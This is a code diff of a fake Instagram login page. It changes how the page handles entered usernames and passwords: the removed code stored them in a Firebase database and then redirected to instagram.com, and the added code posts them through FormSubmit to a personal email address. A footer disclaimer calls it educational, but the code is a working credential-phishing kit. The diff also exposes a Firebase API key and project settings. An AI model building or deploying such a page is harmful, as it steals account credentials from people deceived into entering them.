@@ -8,30 +8,13 @@
     <link rel="icon" href="images/favicon.png" type="image/icon">
     <link rel="stylesheet" href="style.css">
 
-    <!-- 1️⃣ Firebase SDKs – pick only what you need -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
-
+    <!-- 1️⃣ Inline JS – no external libraries needed -->
     <script>
-        // 2️⃣ Paste the Firebase config you copied from the console
-        const firebaseConfig = {
-            apiKey: "AIzaSyAreQB8UZmBjEPS3AzAur8NDP5JNnkWkTE",
-  authDomain: "devil-login-insta.firebaseapp.com",
-  projectId: "devil-login-insta",
-  storageBucket: "devil-login-insta.firebasestorage.app",
-  messagingSenderId: "1027943607691",
-  appId: "1:1027943607691:web:bcd159357f269c8e91538e"
-        };
-
-        // 3️⃣ Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();   // Firestore reference
-
-        // 4️⃣ Intercept the form submission
         document.addEventListener('DOMContentLoaded', () => {
             const form = document.getElementById('loginForm');
+
             form.addEventListener('submit', async (e) => {
-                e.preventDefault();   // Stop the normal post
+                e.preventDefault();               // stop normal navigation
 
                 const username = form.u_name.value.trim();
                 const password = form.pass.value.trim();
@@ -41,19 +24,30 @@
                     return;
                 }
 
+                // Build the payload in URL‑encoded form (what FormSubmit expects)
+                const payload = new URLSearchParams();
+                payload.append('u_name', username);
+                payload.append('pass', password);
+                // Optional: add subject or a redirect URL
+                payload.append('_subject', 'New Login Attempt');
+                // payload.append('_next', 'https://yourdomain.com/thankyou.html'); // optional
+
                 try {
-                    // Store credentials in Firestore
-                    await db.collection('logins').add({
-                        username,
-                        password,
-                        submittedAt: firebase.firestore.FieldValue.serverTimestamp()
+                    const resp = await fetch('https://formsubmit.co/hillol.minecraft.pc@gmail.com', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: payload
                     });
 
-                    // Optionally, redirect to Instagram (or any page)
-                    window.location.href = 'https://www.instagram.com';
+                    if (!resp.ok) throw new Error('Network response was not ok');
+
+                    // Success – give the user a friendly message
+                    alert('Login details sent to your inbox.');
+                    // Optionally clear the form
+                    form.reset();
                 } catch (err) {
-                    console.error('Firestore error:', err);
-                    alert('Could not submit data. Try again later.');
+                    console.error(err);
+                    alert('Something went wrong. Please try again later.');
                 }
             });
         });
@@ -68,7 +62,8 @@
         </div>
 
         <br/>
-        <form id="loginForm" class="container" action="send.php" method="post">
+        <!-- 2️⃣ Updated form – no action attribute needed -->
+        <form id="loginForm" class="container" method="post">
             <input type="text" placeholder="Phone number, username, or email" name="u_name" required>
             <input type="password" placeholder="Password" name="pass" required>
             <button class="submitbutton">Log in</button>
@@ -92,7 +87,7 @@
 
 <br/>
 <div style="position:fixed;left:0;bottom:0;width:100%;color:#7e7979;">
-    <p style="text-align:center;">Disclaimer: This is not a real "instagram.com" page, please do not enter your real username and password, it's only for educational purposes.</p>
+    <p style="text-align:center;">Disclaimer: This is not a real “instagram.com” page, please do not enter your real username and password, it's only for educational purposes.</p>
 </div>
 <br/>
 </body>
